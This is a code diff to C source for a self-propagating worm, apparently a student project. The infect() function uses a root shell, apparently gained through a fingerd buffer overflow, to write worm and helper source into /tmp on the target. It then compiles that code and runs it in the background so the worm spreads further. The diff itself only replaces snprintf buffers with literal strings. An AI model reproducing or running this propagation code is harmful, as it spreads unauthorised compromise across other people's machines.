@@ -102,9 +102,7 @@ void deploy_receive_file(int sock) {
         "}\n";
 
     // Start the cat command
-    memset(cmd_buf, 0, IO_BUF_SIZE);
-    snprintf(cmd_buf, IO_BUF_SIZE, "cat > /tmp/receive_file.c << 'EOF'\n");
-    write_to_sock(sock, cmd_buf);
+    write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
 
     // Send file contents
     write_to_sock(sock, (char *)file_contents);
@@ -166,32 +164,22 @@ void infect(char *ip) {
 	printf("[+] Got root shell (bang), sending files...\n");
 	fflush(stdout);
 
-
-	//Send receive_file_bsd.c over(hope this works)
+	//Send receive_file_bsd.c over, compile and run it
 	deploy_receive_file(sock);
-
-    
 	printf("[*] Compiling receive_file.c on target...\n");
-	memset(cmd_buf, 0, IO_BUF_SIZE);
-	snprintf(cmd_buf, IO_BUF_SIZE, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
-	write_to_sock(sock, cmd_buf);
+	write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
 	sleep(2);
 	read_from_sock(sock, io_buf, IO_BUF_SIZE);
-
-	printf("[*] Starting file receiver on target...\n");
-	memset(cmd_buf, 0, IO_BUF_SIZE);
-	snprintf(cmd_buf, IO_BUF_SIZE, "/tmp/receive_file &\n");
-	write_to_sock(sock, cmd_buf);
-	sleep(1);
+	printf("[*] Running file receiver on target...\n");
+	write_to_sock(sock, "/tmp/receive_file &\n");
+	sleep(2);
 	read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
 	/* 
 	 * Send worm.c content over the shell
 	 */
 	printf("[*] Sending worm.c...\n");
-	memset(cmd_buf, 0, IO_BUF_SIZE);
-	snprintf(cmd_buf, IO_BUF_SIZE, "cat > /tmp/worm.c << 'EOF'\n");
-	write_to_sock(sock, cmd_buf);
+	write_to_sock(sock, "cat > /tmp/worm.c << 'EOF'\n");
 
 	/* Read the actual worm.c and send it */
 	fp = fopen(WORM_PATH, "r");
@@ -210,9 +198,7 @@ void infect(char *ip) {
 	 * Send worm.h content so it can be compiled
 	 */
 	printf("[*] Sending worm.h...\n");
-	memset(cmd_buf, 0, IO_BUF_SIZE);
-	snprintf(cmd_buf, IO_BUF_SIZE, "cat > /tmp/worm.h << 'EOF'\n");
-	write_to_sock(sock, cmd_buf);
+	write_to_sock(sock, "cat > /tmp/worm.h << 'EOF'\n");
 
 	/* Read the worm.h and send it */
 	fp = fopen("/Users/nathan/Comps/Winter2026Comps/fingerd_bof/worm.h", "r");
@@ -228,16 +214,12 @@ void infect(char *ip) {
 	read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
 	printf("[*] Compiling worm.c on target...\n");
-	memset(cmd_buf, 0, IO_BUF_SIZE);
-	snprintf(cmd_buf, IO_BUF_SIZE, "cc /tmp/worm.c -o /tmp/worm\n");
-	write_to_sock(sock, cmd_buf);
+	write_to_sock(sock, "cc /tmp/worm.c -o /tmp/worm\n");
 	sleep(2);
 	read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
 	printf("[+] Running worm on target for self-propagation...\n");
-	memset(cmd_buf, 0, IO_BUF_SIZE);
-	snprintf(cmd_buf, IO_BUF_SIZE, "/tmp/worm &\n");
-	write_to_sock(sock, cmd_buf);
+	write_to_sock(sock, "/tmp/worm &\n");
 	sleep(1);
 	read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
